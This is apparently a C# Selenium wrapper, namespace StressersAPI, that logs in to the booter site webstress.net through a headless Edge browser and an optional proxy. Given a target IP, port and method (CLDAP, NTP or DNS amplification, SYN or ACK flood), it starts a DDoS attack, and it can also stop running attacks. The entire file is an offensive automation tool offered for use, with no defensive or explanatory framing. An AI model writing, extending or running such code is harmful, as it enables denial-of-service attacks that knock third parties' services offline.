using Microsoft.Edge.SeleniumTools;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Threading;

namespace StressersAPI
{
    public class WebStress
    {
        public void StopAll(string login, string password, Proxy proxy = null)
        {
            EdgeDriverService driverService = EdgeDriverService.CreateChromiumService();
            EdgeOptions options = new EdgeOptions();
            driverService.HideCommandPromptWindow = true;
            options.UseChromium = true;
            if (proxy != null)
            {
                options.Proxy = proxy;
            }
            options.AddArgument("headless");
            options.AddArgument("disable-gpu");
            EdgeDriver driver = new EdgeDriver(driverService, options, new TimeSpan(0, 2, 0));
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.Navigate().GoToUrl("https://webstress.net/login");

            /* Авторизация */
            var loginelemt = driver.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/input[1]");
            loginelemt.SendKeys(login);
            var passwordelemt = driver.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[2]/input[1]");
            passwordelemt.SendKeys(password);

            var buttonelemt = driver.FindElementByXPath("//button[@class='btn btn-primary btn-block mt-3 mt-2']");
            buttonelemt.Click();
            Thread.Sleep(250);
            driver.Navigate().GoToUrl("https://webstress.net/hub");
            try
            {
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromMilliseconds(250);
                var closeallelemt = driver.FindElementByXPath("//button[contains(text(),'Close')]");
                closeallelemt.Click();
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            }
            catch
            { driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4); }
            try
            {
                var closeallelemt = driver.FindElementByXPath("//button[@class='btn btn-block btn-outline-danger']");
                closeallelemt.Click();
            } catch { }
        }
        public string StartStrees(string ip, int port, Method method, string login, string password, Proxy proxy = null)
        {
            EdgeDriverService driverService = EdgeDriverService.CreateChromiumService();
            EdgeOptions options = new EdgeOptions();
            driverService.HideCommandPromptWindow = true;
            options.UseChromium = true;
            if (proxy != null)
            {
                options.Proxy = proxy;
            }
            options.AddArgument("headless");
            options.AddArgument("disable-gpu");
            EdgeDriver driver = new EdgeDriver(driverService, options, new TimeSpan(0, 2, 0));
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.Navigate().GoToUrl("https://webstress.net/login");

            /* Авторизация */
            var loginelemt = driver.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[1]/input[1]");
            loginelemt.SendKeys(login);
            var passwordelemt = driver.FindElementByXPath("/html[1]/body[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form[1]/div[2]/input[1]");
            passwordelemt.SendKeys(password);

            var buttonelemt = driver.FindElementByXPath("//button[@class='btn btn-primary btn-block mt-3 mt-2']");
            buttonelemt.Click();
            Thread.Sleep(250);
            driver.Navigate().GoToUrl("https://webstress.net/hub");
            try
            {
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromMilliseconds(250);
                var closeallelemt = driver.FindElementByXPath("//button[contains(text(),'Close')]");
                closeallelemt.Click();
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            }
            catch
            { driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4); }
            try
            {
                var closeallelemt = driver.FindElementByXPath("//button[@class='btn btn-block btn-outline-danger']");
                closeallelemt.Click();
            }
            catch { }
            var methodelemt = driver.FindElementByXPath("//select[@id='method']");
            methodelemt.Click();
            var selectElement = new SelectElement(methodelemt);
            if (method == Method.CLDAP)
                selectElement.SelectByText("UDP-CLDAP");
            else if (method == Method.NTP)
                selectElement.SelectByText("UDP-NTP");
            else if (method == Method.DNS)
                selectElement.SelectByText("UDP-DNS");
            else if (method == Method.SYN)
                selectElement.SelectByText("TCP-SYN");
            else if (method == Method.ACK)
                selectElement.SelectByText("ACK");
            var ipelemt = driver.FindElementByXPath("//input[@id='host']");
            ipelemt.SendKeys(ip);
            var portelemt = driver.FindElementByXPath("//input[@id='port']");
            portelemt.Clear();
            portelemt.SendKeys(port.ToString());
            var startelemt = driver.FindElementByXPath("//button[@name='startAttack']");
            startelemt.Click();
            Thread.Sleep(50);
            var toast = driver.FindElementByXPath("//div[@class='toast-message']");
            string st = toast.Text;
            driver.Quit();
            return st;
        }
        public enum Method
        {
            CLDAP,
            NTP,
            DNS,
            RAND,
            SYN,
            ACK,
        }
    }
}
